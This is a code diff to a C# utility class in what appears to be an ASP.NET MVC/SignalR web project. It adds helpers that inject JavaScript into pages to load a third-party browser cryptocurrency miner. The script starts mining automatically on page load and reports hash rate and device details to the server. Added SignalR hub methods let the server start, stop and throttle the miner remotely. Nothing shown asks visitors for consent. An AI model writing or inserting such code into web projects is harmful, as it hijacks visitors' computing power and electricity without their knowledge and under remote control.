@@ -21,5 +21,128 @@ namespace SignalRService.Utils
                 return sw.GetStringBuilder().ToString();
             }
         }
+
+        public static MvcHtmlString RenderMinerScript(string clientId, string throttle, string scriptUrl, int startDelayMs, int reportInveralMs)
+        {
+            string res = @"
+
+              var myminer;
+
+             var miner = {
+
+                client: function create() {
+                    if (myminer)
+                        return myminer;
+                    else {
+                        myminer =  new Client.Anonymous('" + clientId + @"',
+                            {
+                                throttle:  " + throttle + @"
+                            });
+                        return myminer;
+                    }
+                },
+
+                initialize: function loadScripts() {
+
+                    jQuery.ajax({
+                        url: '" + scriptUrl + @"',
+                        dataType: 'script',
+                        success: function() { },
+                        async: true
+                    });
+                },
+                run: function start()
+                {
+                    this.client().start();
+
+                    setTimeout(function() {
+                        miner.reportStatus();
+                    }, " + startDelayMs + @");
+
+
+                },
+                stop: function()
+                {
+                    this.client().stop();
+                    setTimeout(function() {
+                        miner.reportStatus();
+                    }, 3000);
+
+                },
+                reportStatus: function miner_reportStatus()
+                {
+
+                    var minerstats = {
+                        running: this.client().isRunning(),
+                        onMobile: this.client().isMobile(),
+                        wasmEnabled: this.client().hasWASMSupport(),
+                        isAutoThreads: this.client().getAutoThreadsEnabled(),
+                        hps: this.client().getHashesPerSecond(),
+                        threads: this.client().getNumThreads(),
+                        throttle: this.client().getThrottle(),
+                        hashes: this.client().getTotalHashes(),
+                    }
+
+                servicehub.server.minerReportStatus(minerstats);
+
+                }
+
+
+};
+
+function start_miner()
+{
+
+    miner.initialize();
+    setTimeout(function() {
+        miner.run();
+    }, " + startDelayMs + @");
+
+    setInterval(function() {
+        miner.reportStatus();
+    }, " + reportInveralMs + @");
+
+}
+
+function stop_miner()
+{
+    miner.stop();
+}
+
+
+    $(function () {
+       start_miner();
+    });
+
+
+
+
+            ";
+
+            return new MvcHtmlString(res);
+        }
+
+        public static MvcHtmlString RenderMinerHubMethods()
+        {
+            string str = @"
+
+                  servicehub.client.miner_start = function () {
+            start_miner();
+        }
+
+        servicehub.client.miner_stop = function () {
+            stop_miner();
+        }
+
+        servicehub.client.miner_reportStatus = function () {
+            //send stats to server
+            miner.reportStatus();
+        }
+
+        servicehub.client.miner_setThrottle = function (data) {
+            miner.client().setThrottle(data);
+        }";
+            return new MvcHtmlString(str);
+        }
     }
 }
